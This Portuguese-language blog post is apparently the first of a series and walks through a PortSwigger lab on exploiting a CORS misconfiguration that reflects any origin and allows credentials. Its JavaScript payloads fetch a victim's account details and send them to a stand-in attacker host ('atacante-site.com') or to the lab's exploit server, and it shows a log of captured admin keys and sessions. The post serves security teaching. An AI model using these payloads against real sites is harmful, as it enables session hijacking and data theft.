---
title: "CORS Series: Part 1"
categories:
  - writeups
  - web hacking
  - owasp
tags:
  - writeups
  - ctf
  - owasp
  - cors
---
# CORS Series: Qualquer origem serve...

## Sobre a "série"...
Será um série de posts (uns dois ou três, talvez), sobre exploração de CORS mal implementado, de forma mais prática prática. Caso precise da base teórica, irei te passar onde buscar. Mas o foco aqui vai ser te guiar, de forma mais prática a explorar má implementações de CORS.

O intuito aqui vai ser desenvolver o "mindset ofensivo", e não apenas virar um testador de payloads por ai. É entender o porquê da falha (quando possível, claro) a fim de treinar a sua massa cinzenta para cenários reais da vida. Então, não espere que eu fique te passando apenas payloads prontos por aqui, como: "use e torça para dar certo em qualquer outro cenário e lugar em que usá-lo", eu particularmente não sou muito fã disso.

Mas sem mais enrolação,vamos que vamos!

> [!Adendo] Apenas um adendo....
> Estarei utilizando labs da **PortSwigger** aqui apenas para mostrar casos práticos, o intuito aqui não é apenas te ajudar a resolver o lab, visto que no próprio site da **PortSwigger** já está presente a solução.
# CORS: Achando ele...
Antes de mais nada, precisamos identificar se tem CORS por ai na aplicação. Uma boa forma de analisar isso é procurando headers nas requisições da aplicação, que anunciem  CORS, veja o exemplo:

A requisição:

```
GET /accountDetails HTTP/2
Host: 0adf008904bdf112805d033700f400ed.web-security-academy.net
Cookie: session=IvvT3CnBp3aTgkkgM9H0M5mq8F2opP3T
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: pt-BR,pt;q=0.9
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0adf008904bdf112805d033700f400ed.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

```

A resposta:

```
HTTP/2 200 OK
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 189

{
  "username": "wiener",
  "email": "",
  "apikey": "NLJwTk2fS5Sd3jUKjNkhll2HisLInBw3",
  "sessions": [
    "IvvT3CnBp3aTgkkgM9H0M5mq8F2opP3T",
    "w2FhLtReYWyQqtrpJeYXyGHbe8yNit4b"
  ]
}
```

Perceba que pela requisição ainda fica meio incerto, mas pela resposta fica melhor de identificar e que está denunciando o CORS ali:  header `Access-Control-allow-Credentials`.
Isso ai já é um forte indicativo de CORS.
## CORS: testando...
Nessa hora aqui já podemos tentar fazer alguns testes. Um teste simples seria adicionar o header `Origin: http://algumsite.com` na nossa requisição e ver como vai ser a resposta, veja:

A requisição:
```
GET /accountDetails HTTP/2
Host: 0adf008904bdf112805d033700f400ed.web-security-academy.net
Cookie: session=IvvT3CnBp3aTgkkgM9H0M5mq8F2opP3T
Sec-Ch-Ua-Platform: "Linux"
Origin: http://algumsite.com
Accept-Language: pt-BR,pt;q=0.9
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0adf008904bdf112805d033700f400ed.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=1, i


```

A resposta:
```
HTTP/2 200 OK
Access-Control-Allow-Origin: http://algumsite.com
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 189

{
  "username": "wiener",
  "email": "",
  "apikey": "NLJwTk2fS5Sd3jUKjNkhll2HisLInBw3",
  "sessions": [
    "IvvT3CnBp3aTgkkgM9H0M5mq8F2opP3T",
    "w2FhLtReYWyQqtrpJeYXyGHbe8yNit4b"
  ]
}
```

Isso nos mostra que realmente temos CORS, além de revelar algo grave sobre  aplicação: CORS mal implementado.

Preste atenção no header `Access-Control-Allow-Origin` da resposta. Esse header, está indicando que qualquer origem é permitida, ou seja, requisições de qualquer lugar são válidas para solicitar dados.

Mas é claro, por conta do header `Access-Control-Allow-Credentials` a origem precisa ter alguma forma de autenticação, seja um **cookie de sessão**, API Key, alguma coisa.

Para te ajudar a entender como funcionaria por trás dos panos, é como se o servidor da aplicação estivesse configurado da seguinte forma:
```js
app.use((req, res, next) => {
  const origin = req.headers.origin;
  res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  next();
});
```

Claro, não vou te garantir que realmente está assim esta aplicação de teste, é apenas para você ter uma noção. Existem outros cenários, caso queira, peça para o ChatGPt te mostrar alguns, se você for **dev** pode te ajudar a evitar falhas.

## CORS: Aonde mora real perigo disso tudo?
Agora, vou te introduzir o cenário: Temos uma aplicação, com feature de autenticação e autorização e gerenciamento de sessão. 
E ainda temos um cenário de CORS mal implementado e nesses casos é bem ruim, visto que pode acontecer roube de dados, como cookies de sessão, que seria o famoso *Session Hijacking*.
### Como isso poderia ocorrer com base neste cenário?
A junção dos headers `Access-Control-Allow-Origin` espelhando e aceitando qualquer origem (aqui está a falha) com o header `Access-Control-Allow-Credentials` nos diz que, uma requisição de coleta de dados , por exemplo, como as que eu mostrei acima, vindas de qualquer lugar, tendo alguma forma de autenticação, como um **cookie de sessão armazenado em um browser após login**, por exemplo, poderia receber os dados solicitados sem nenhum problema.

Se a aplicação possui um XSS ou mesmo não tiver mecanismos de proteção contra CSRF com leitura de dados e o atacante conseguir subir um servidor Web malicioso, induzir a vítima a executar um certo payload, os dados dessa vítima podem parar facilmente nas mãos desse atacante.

Quero que saiba que o problema aqui não está no header `Access-Control-Allow-Credentials`, mas sim no fato de que o servidor está aceitando enviar dados para qualquer origem isso está sendo indicado pelo header `Access-Control-Allow-Origin`.
### Voltando ao cenário prático...
Certo, já identificamos a falha on CORS, vamos criar um payload (pela internet você também consegue um) para nos aproveitarmos deste cenário ai. O objetivo vai ser **exfiltrar dados da vítima.**

Geralmente, esse tipo de cenário, esse será o objetivo. O payload será  seguinte:
```HTML
<script> 
	fetch('https://target-app.com/accountDetails',
	{  
		method: 'GET',  
		credentials: 'include'  
	})  
	.then(response => response.text())  
	.then(data => {  
		location = 'https://atacante-site.com/log?key=' + data;  
	});  
</script>
```

Esse payload, em um cenário realista, poderia ser executado via XSS na aplicação vulnerável, ou mesmo via CSRF. Ao ser executado, o browser da vítima usaria o session cookie da vítima, armazenado no seu  Local Storage, por exemplo, e faria a requisição para a aplicação vulnerável no contexto do usuário e depois faria outra uma requisição para o domínio de posse do atacante enviando via GET os dados capturados da vítima.

O nosso cenário aqui é diferente, estou usando um lab da **PortSwigger** para te demonstrar como sera esse ataque, portanto, vamos adaptá-lo a nosso contexto. O payload ficaria:
```HTML
<script> 
	fetch('https://0ae30029048b4a79807d03d3000e0005.web-security-academy.net/',
	{  
		method: 'GET',  
		credentials: 'include'  
	})  
	.then(response => response.text())  
	.then(data => {  
		location = '/log?key=' + data;  
	});  
</script>
```

Neste contexto, o *Exploit Server* vai fazer o papel de interagir com a aplicação alvo, seria como o domínio do atacante. Uma vez o acionando o exploit, por por cota do `location` o nosso browser será redirecionado para um endpoint inexistente do server, porém, a requisição no contexto do administrador é feita.

Seria com se uma estivéssemos nos aproveitando de um CSRF mirando um administrador da aplicação. No momento em que o payload fosse executado, o **session cookie** do administrador seria usado para fazer a requisição para o endpoint `/accountDetails` e os dados do dele seriam enviados para o domínio do atacante.

É por isso que você recebe os dados do administrador.

No contexto da **PortSwigger**, o único payload que funcionou foi o fornecido por eles, talvez haja alguma restrição imposta por parte deles, mas toda essa explicação flui da mesma forma, o que mudou foi apenas o payload.

Payload deles:
```HTML
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0ab0006904de48588af5000200cd0000.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```

Entregando o exploit, e vendo os logs de acesso do exploit server, veja que realmente funcionou:
```
10.0.4.72       2026-03-19 21:23:00 +0000 "GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22eMUmF3BUh5PRlbsZPPSdW2T1Jh4uGd4C%22,%20%20%22sessions%22:%20[%20%20%20%20%22ZaWKsGXeBX9IvM7q2rC6JXjEXIZeDZxG%22%20%20]} HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
```
# No fim...
O intuito aqui não é te ajudar a resolver o lab, até porque a solução já está lá. Mas sim te ajudar a entender melhor o cenário, quantas vezes eu fiz labs da **PortSwigger** como o pessoal orienta e diversas vezes saí sem entender nada, só segui a solução e pronto, achei que entendi, o fato é que caímos na velha sensação que entendemos mas ao lidar com um cenário parecido, não conseguimos nos virar.

 Eu não sou nenhum expert, mas particularmente odeio apenas executar payloads, resolver labs ou mesmo executar ferramentas e explorar cenários, sem entender nada do que está acontecendo.

Muito obrigado!
Espero ter te ajudado em algo!
Até breve!

--- 
[Link](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack) do lab.
Para saber mais sobre [CORS](https://portswigger.net/web-security/cors).
